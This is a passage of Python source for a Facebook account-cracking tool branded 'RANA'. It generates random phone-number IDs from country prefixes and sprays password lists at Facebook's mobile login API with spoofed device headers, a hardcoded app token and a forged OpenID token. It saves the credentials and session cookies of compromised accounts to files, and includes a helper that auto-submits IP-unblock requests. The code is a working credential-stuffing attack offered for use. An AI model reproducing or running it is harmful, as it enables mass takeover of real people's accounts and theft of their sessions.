                                ranag1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W} THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W} TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W} PRESS ENTER TO BACK ')
                menu()

def afg():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 9377,9379,9374')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as ranag1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶Ã›Â·Ã›Â¸Ã›Â¹','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                ranag1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                menu()
def ind():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 91***,etc')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as ranagg:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','57575751']
                                ranagg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                menu()
                
def rd(uid,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r{W} [{R}RANA{W}]%s|{R}RNDM{W}|\033[1;32mOK:%s\033[1;37m|{R}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
		for pas in passlist:
			data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': uid,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
			head = {'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [RANA-OK] '+uid+' | '+pas+'\033[1;37m')
				#os.system('espeak -a 300 " Congratulation,   Dear,  ,User,"')
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				RANA1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RANA1};{ckkk}"
				print(f'\r\033[1;32m [COOKIES] :{W} '+cookie)
				open('/sdcard/RANA/RANA-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r{W} [RANA-CP] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/RANA/RANA-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleeprint(20)
	except Exception as e:
		pass
########SEPRATE#######
def with_names():
		#logo()
		#os.system('espeak -a 300 " Enter,   File,  ,Name,"')
		finput = input(f'{W} [{R}+{W}] {W}PUT FILE PATH :')
		sav= input(f'{W} [{R}+{W}] {W}SAVE FILE PATH : ')
		digits = input(f'{W} [{R}+{W}] {W}PUT DIGIT : ').split(',')
		spc=[]
		try:
			file = open(finput,'r').read().splitlines()
			xx = open(sav,'a')
			for mix in file:
				uid = mix.split('|')[0]
				nm = mix.split('|')[1]
				for digit in digits:
					if digit in uid:
						if uid not in spc:
							if uid.startswith(digit):
								xx.write(uid+'|'+nm+'\n')
			print(f'{W} [{R}+{W}] {W}SEPRATE DONE!!!!!')
			print(f'{W} [{R}+{W}] {W}YOUR FILE SAVED IN : %s '%(sav))
			line()
			input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK  ")
			line()
			menu()
		except FileNotFoundError:
			print(f'{W} [{R}+{W}] {W}FILE NOT FOUND !!!!')
####USED LINE CUTER#####


def used_cutter():
		clear()
		#logo()
		lines=[]
		print(f"{W} [{R}+{W}] {W}\x1b[1;97mEX : /sdcard/file.txt")
		try:
			file = input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT FILE  : ")
		except Exception as e:
			print(f"{W} [{R}+{W}] {W}FILE NOT FOUND!! ");used_cutter()
		digit= int(input(f"{W} [{R}+{W}] {W}\x1b[1;97mPUT LINE :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		print(f"{W} [{R}+{W}] {W}REMOVED DONE")
		menu()
#######DOUBLE LINK REMOVE#####
def remove_links():
	    clear()
	    #os.system('espeak -a 300 " Enter,   File,  ,Name,"')
	    file_path = input(f"{W} [{R}+{W}] {W}FILE PATH : ")
	    with open(file_path, "r") as file:
		    lines = file.readlines()
	    with open(file_path, "w") as file:
		    file.writelines(set(lines))
	    line()
	    print(f"{W} [{R}+{W}] {W}SUCCESSFULL REMOVED !\033[0m")
	    print(f"{W} [{R}+{W}] {W}IDZ SAVED IN {file_path} \033[0m")
	    line()
	    input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ")
	    menu()
#####_____IP-UNBLOCK_____#####
ip_check_url = "http://ip-api.com/json/"
ip_unblock_url= 'https://updraftplus.com/unblock-ip-address/'
def ipMain():
		clear()
		print(f"{W} [{R}+{W}] {W}          UNBLOCK YOUR IP By RANA TOOL")
		line()
		print(f"{W} [{R}1{W}] {W}MANUAL")
		print(f"{W} [{R}2{W}] {W}AUTO")
		line()
		m = input(f"{W} [{R}+{W}] {W}SELECT: ")
		if m in ['1','01']:manual()
		else:iAmIPChecker()
def manual():
		clear()
		print(f"{W} [{R}+{W}] {W}TRY TO UNBLOCK YOUR IP BY RANA TOOL")
		print(f"{W} [{R}+{W}] {W}GO TO SETTING AND OPEN ABOUT PHONE ")
		print(f"{W} [{R}+{W}] {W}COPY YOUR IP FROM ABOUT AND PASTE HERE ")
		line ()
		ip = input(f"{W} [{R}+{W}] {W}PASTE YOUR IP : ")
		line()
		iAmIPUnblocker(ip)
def iAmIPChecker():
		clear()
		print(f"{W} [{R}+{W}] {W}USE FLIGHT MODE FOR 5 SECND BEFORE USE .")
		input(f"{W} [{R}+{W}] {W}PRESS ENTER TO START ...")
		line()
		print(f"{W} [{R}+{W}] {W}DETECTING YOUR IP PLEASE WAIT ...")
		try:
			getting_network_ip = requests.get(ip_check_url).json()
			ip = getting_network_ip["query"]
			print(f"{W} [{R}+{W}] {G}YOUR IP ADRESS : {ip}")
			iAmIPUnblocker(str(ip))
		except requests.exceptions.ConnectionError:
			print(f"{W} [{R}+{W}] {R}CHECK YOUR CONNECTION  ")
		except KeyError:
			print(f"{W} [{R}+{W}] {W}PLEASE CHANGE YOUR NETWORK  !! ..")
		except Exception as e:
			print(e)
def iAmIPUnblocker(x):
		print(f"{W} [{R}+{W}] {G}TRYING TO UNBLOCK YOUR IP ...")
		try:
			r2 = requests.get(ip_unblock_url).text
		except requests.exceptions.ConnectionError:
			print(f"{W} [{R}+{W}] {R}CHECK YOUR NET CONNECTION  ")
		data={}
		ud_unblock_ip = x
		nonce= re.search('name="nonce" value="(.*?)"',r2).group(1)
		data.update({'ud_unblock_ip':ud_unblock_ip,'nonce':nonce,})
		try:
			po = requests.post(ip_unblock_url,data=data).text
		except requests.exceptions.ConnectionError:
			print(f"{W} [{R}+{W}] {W}CHECK YOUR NET CONNECTION ")
		if "{W} [{R}+{W}] {W}YOUR IP UNBLOCK FAIL " in po:
			print(f"{W} [{R}+{W}] {W}TRY AGAIN LATTER... ")
			line()
		elif "{W} [{R}+{W}] {W}THIS IP RECENTLY UNBLOCKED." in po:
			exit(f"{W} [{R}+{W}] {W}THIS IP ALREADY UNBLOCKED ")
		else:
			pass
			print(f"{W} [{R}+{W}] {G}YOR IP UNBLOCK SUCCESSFULLY")
			input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK HOME ...")
			menu()
#####____END-Setup____#####   
menu()
